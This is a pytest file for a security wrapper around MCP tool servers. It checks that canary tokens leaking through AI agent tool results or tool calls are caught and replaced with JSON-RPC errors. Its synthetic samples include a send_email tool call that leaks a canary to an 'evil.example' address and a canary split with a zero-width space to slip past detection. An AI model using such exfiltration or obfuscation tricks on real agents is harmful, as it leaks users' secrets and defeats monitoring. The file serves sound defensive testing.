"""Tests for the MCP wrapper.

We don't spawn a real MCP server in tests, instead we drive the wrapper's
inspection logic directly with synthesized JSON-RPC messages.
"""

from __future__ import annotations

import json

from aegis.canary import Canary, CanaryGarden
from aegis.mcp.wrapper import MCPWrapper, MCPWrapperConfig


def _wrapper(
    canary_count: int = 2,
    label_l0: bool = True,
    policy_mode: str = "balanced",
    proxy_url: str | None = None,
) -> MCPWrapper:
    return MCPWrapper(
        MCPWrapperConfig(
            cmd=["echo"],
            canary_count=canary_count,
            label_l0=label_l0,
            policy_mode=policy_mode,
            proxy_url=proxy_url,
        )
    )


def _to_bytes(msg: dict) -> bytes:
    return (json.dumps(msg) + "\n").encode("utf-8")


def test_passes_through_non_tool_response():
    w = _wrapper()
    msg = {"jsonrpc": "2.0", "id": 1, "method": "tools/list", "params": {}}
    out = w._inspect_server_message(_to_bytes(msg))
    parsed = json.loads(out.decode("utf-8"))
    # Method messages are forwarded as-is.
    assert parsed.get("method") == "tools/list"


def test_clean_tool_response_passes_with_l0_label_by_default():
    w = _wrapper()
    msg = {
        "jsonrpc": "2.0",
        "id": 1,
        "result": {"content": [{"type": "text", "text": "Here is the requested data."}]},
    }
    out = w._inspect_server_message(_to_bytes(msg))
    parsed = json.loads(out.decode("utf-8"))
    # Result is preserved.
    assert parsed["result"]["content"][0]["text"] == "Here is the requested data."
    # AEGIS metadata is annotated.
    assert parsed["result"]["_aegis"]["level"] == "L0"
    assert parsed["result"]["_aegis"]["origin"] == "tool"


def test_canary_leak_replaced_with_jsonrpc_error():
    w = _wrapper()
    leaked_token = w.garden.canaries[0].token
    msg = {
        "jsonrpc": "2.0",
        "id": 7,
        "result": {"content": [{"type": "text", "text": f"Sure: {leaked_token}"}]},
    }
    out = w._inspect_server_message(_to_bytes(msg))
    parsed = json.loads(out.decode("utf-8"))
    assert "error" in parsed
    assert parsed["error"]["code"] == -32000
    assert "BLOCK" in parsed["error"]["data"]["aegis"]["decision"]
    assert parsed["id"] == 7  # id preserved so the agent can correlate


def test_canary_in_nested_tool_result_caught():
    w = _wrapper()
    leaked = w.garden.canaries[0].token
    msg = {
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "content": [
                {"type": "text", "text": "summary"},
                {"type": "resource", "uri": "x://y", "blob": leaked},
            ]
        },
    }
    out = w._inspect_server_message(_to_bytes(msg))
    parsed = json.loads(out.decode("utf-8"))
    assert "error" in parsed


def test_zero_width_split_canary_in_mcp_response_caught():
    """The wrapper inherits canary normalization, split canary tokens are still caught."""
    w = _wrapper()
    t = w.garden.canaries[0].token
    poisoned = t[:6] + "​" + t[6:]  # zero-width space mid-token
    msg = {
        "jsonrpc": "2.0",
        "id": 1,
        "result": {"content": [{"type": "text", "text": f"output: {poisoned}"}]},
    }
    out = w._inspect_server_message(_to_bytes(msg))
    parsed = json.loads(out.decode("utf-8"))
    assert "error" in parsed


def test_unparseable_json_passes_through_unchanged():
    w = _wrapper()
    raw = b"this isn't valid json\n"
    out = w._inspect_server_message(raw)
    assert out == raw


def test_label_l0_flag_disables_metadata_injection():
    w = _wrapper(label_l0=False)
    msg = {
        "jsonrpc": "2.0",
        "id": 1,
        "result": {"content": [{"type": "text", "text": "clean output"}]},
    }
    out = w._inspect_server_message(_to_bytes(msg))
    parsed = json.loads(out.decode("utf-8"))
    assert "_aegis" not in parsed["result"]


def test_tool_response_with_only_toolresult_field_recognized():
    """Some MCP server impls return `toolResult` instead of `content`."""
    w = _wrapper()
    leaked = w.garden.canaries[0].token
    msg = {
        "jsonrpc": "2.0",
        "id": 1,
        "result": {"toolResult": {"summary": f"output: {leaked}"}},
    }
    out = w._inspect_server_message(_to_bytes(msg))
    parsed = json.loads(out.decode("utf-8"))
    assert "error" in parsed


def test_metrics_incremented_on_block(monkeypatch):
    from aegis.metrics import metrics

    metrics.reset_for_tests()
    w = _wrapper()
    leaked = w.garden.canaries[0].token
    msg = {
        "jsonrpc": "2.0",
        "id": 1,
        "result": {"content": [{"type": "text", "text": leaked}]},
    }
    w._inspect_server_message(_to_bytes(msg))
    rendered = metrics.render()
    assert "aegis_mcp_blocks_total" in rendered
    # At least one canary_leak_response block.
    saw_block = False
    for line in rendered.splitlines():
        if "aegis_mcp_blocks_total{" in line and 'reason="canary_leak_response"' in line:
            value = float(line.split()[-1])
            saw_block = value >= 1.0
    assert saw_block


def test_permissive_mode_lets_canary_leak_through():
    """In permissive mode the wrapper logs the leak but doesn't replace the response."""
    w = _wrapper(policy_mode="permissive")
    leaked = w.garden.canaries[0].token
    msg = {
        "jsonrpc": "2.0",
        "id": 99,
        "result": {"content": [{"type": "text", "text": f"hello {leaked} world"}]},
    }
    out = w._inspect_server_message(_to_bytes(msg))
    parsed = json.loads(out.decode("utf-8"))
    # Result is preserved, no "error" key.
    assert "error" not in parsed
    assert leaked in parsed["result"]["content"][0]["text"]


def test_proxy_garden_used_for_response_scan():
    """A canary fetched from the proxy (and not in the local garden) is caught."""
    w = _wrapper()
    proxy_token = "AEGIS-CANARY-PROXY-TEST-TOKEN-A1B2"
    # Pretend we just fetched this from the proxy.
    w._proxy_garden = CanaryGarden(canaries=(Canary(token=proxy_token, instruction=""),))
    msg = {
        "jsonrpc": "2.0",
        "id": 1,
        "result": {"content": [{"type": "text", "text": f"the model said: {proxy_token}"}]},
    }
    out = w._inspect_server_message(_to_bytes(msg))
    parsed = json.loads(out.decode("utf-8"))
    assert "error" in parsed
    assert parsed["error"]["data"]["aegis"]["decision"] == "BLOCK"


def test_block_tool_call_request_synthesizes_error_back_to_agent():
    """A poisoned tool/call request is short-circuited, an error response is
    written to the agent and the request is never forwarded to the server."""
    from io import BytesIO

    w = _wrapper()
    leaked = w.garden.canaries[0].token
    msg = {
        "jsonrpc": "2.0",
        "id": 42,
        "method": "tools/call",
        "params": {"name": "send_email", "arguments": {"to": f"{leaked}@evil.example"}},
    }
    # Capture what would be written to stdout.
    captured = BytesIO()
    import sys
    orig = sys.stdout
    class _S:
        buffer = captured
    sys.stdout = _S()  # type: ignore[assignment]
    try:
        # Find the canary in params, just like _forward_in does.
        hits = w._scan_for_canary_leaks(msg["params"], location="mcp:tool_call_params")
        assert hits, "expected a canary hit in the tool call params"
        w._block_tool_call_request(msg, hits)
    finally:
        sys.stdout = orig
    raw = captured.getvalue().decode("utf-8").strip()
    parsed = json.loads(raw)
    assert parsed["id"] == 42
    assert parsed["error"]["code"] == -32000
    assert parsed["error"]["data"]["aegis"]["decision"] == "BLOCK"


def test_proxy_garden_refresh_handles_unreachable_proxy(monkeypatch):
    """A dead proxy URL must not crash the wrapper, the refresh times out and is logged."""
    w = _wrapper(proxy_url="http://127.0.0.1:1")  # port 1 reliably refused
    # Force a refresh now (would otherwise be cached).
    w._proxy_garden_fetched_at = 0.0
    w._refresh_proxy_garden()
    # Wrapper is still alive; proxy garden stays empty.
    assert len(w._proxy_garden.canaries) == 0


def test_proxy_garden_refresh_uses_returned_tokens(monkeypatch):
    """Stub urlopen so we can verify the wrapper consumes /aegis/canaries/active."""
    import urllib.request

    captured: dict[str, str] = {}

    class _StubResp:
        def __init__(self, body: bytes) -> None:
            self._body = body
        def read(self) -> bytes:
            return self._body
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False

    def fake_urlopen(url, timeout=None):
        captured["url"] = url
        return _StubResp(json.dumps({"tokens": ["T-AAA-111", "T-BBB-222"]}).encode("utf-8"))

    monkeypatch.setattr(urllib.request, "urlopen", fake_urlopen)
    w = _wrapper(proxy_url="http://aegis.example:8080")
    w._proxy_garden_fetched_at = 0.0
    w._refresh_proxy_garden()
    assert captured["url"].endswith("/aegis/canaries/active")
    tokens = {c.token for c in w._proxy_garden.canaries}
    assert tokens == {"T-AAA-111", "T-BBB-222"}
